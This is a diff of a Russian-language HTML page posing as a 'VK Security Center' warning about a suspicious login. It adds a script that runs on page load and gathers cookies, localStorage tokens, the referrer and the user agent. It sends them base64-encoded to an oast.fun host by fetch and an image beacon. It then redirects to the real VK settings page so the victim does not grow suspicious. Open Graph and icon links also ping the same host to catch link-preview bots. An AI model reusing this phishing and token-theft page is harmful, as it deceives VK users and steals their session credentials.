@@ -2,40 +2,54 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="Срочное обновление безопасности системы">
-    <meta property="og:description" content="Нажмите, чтобы проверить статус вашего аккаунта и защитить данные.">
-    <meta property="og:image" content="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/preview_bot_hit.png">
+    <meta property="og:title" content="Внимание: Обнаружена попытка входа">
+    <meta property="og:image" content="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/bot_hit_og_image.png">
+    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg. Если это не вы, заблокируйте доступ.">
+    
+    <link rel="icon" href="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/bot_hit_favicon.ico">
+    <link rel="apple-touch-icon" href="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/bot_hit_apple.png">
 
-    <title>Security Check</title>
+    <title>VK Security Center</title>
 </head>
 <body>
-    <h1>Идет проверка системных требований...</h1>
-    
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h2>Проверка безопасности аккаунта...</h2>
+        <p>Пожалуйста, подождите, идет синхронизация сессии.</p>
+    </div>
+
     <script>
         (async function() {
-            const oastUrl = "https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/";
+            const oast = "https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/";
             
-            // Собираем всё, что браузер отдаст "молча"
-            let info = {
-                ua: navigator.userAgent,
-                lang: navigator.language,
-                ref: document.referrer, // Проверяем, передает ли VK реферер чата
+            // Собираем доступные куки (не HttpOnly)
+            let localCookies = document.cookie;
+            
+            // Собираем данные окружения
+            let report = {
+                type: "USER_CLICK",
+                cookies: localCookies,
                 url: window.location.href,
-                screen: `${window.screen.width}x${window.screen.height}`
+                ref: document.referrer,
+                ua: navigator.userAgent,
+                storage: JSON.stringify(localStorage) // Иногда токены лежат в LocalStorage!
             };
 
-            // Пытаемся вытащить куки (только не HttpOnly)
+            // Отправляем всё на OAST
             try {
-                info.cookies = document.cookie;
+                // 1. Через fetch
+                fetch(oast + "?data=" + btoa(unescape(encodeURIComponent(JSON.stringify(report)))), {mode: 'no-cors'});
+                
+                // 2. Дублируем через картинку (на случай блокировки fetch)
+                new Image().src = oast + "ping?c=" + btoa(localCookies).substring(0, 50);
             } catch(e) {}
 
-            // Отправляем данные тебе
-            fetch(oastUrl + "?log=" + btoa(JSON.stringify(info)), { mode: 'no-cors' });
+            // Пинг для бота (если вдруг он запустит JS в Headless режиме)
+            fetch(oast + "js_bot_ping");
 
-            // Редирект для правдоподобности (например, на оф. документацию VK)
+            // Через 3 секунды уводим на реальный VK, чтобы не вызывать подозрений
             setTimeout(() => {
-                window.location.href = "https://vk.com/dev";
-            }, 2000);
+                window.location.href = "https://vk.com/settings?act=security";
+            }, 3000);
         })();
     </script>
 </body>
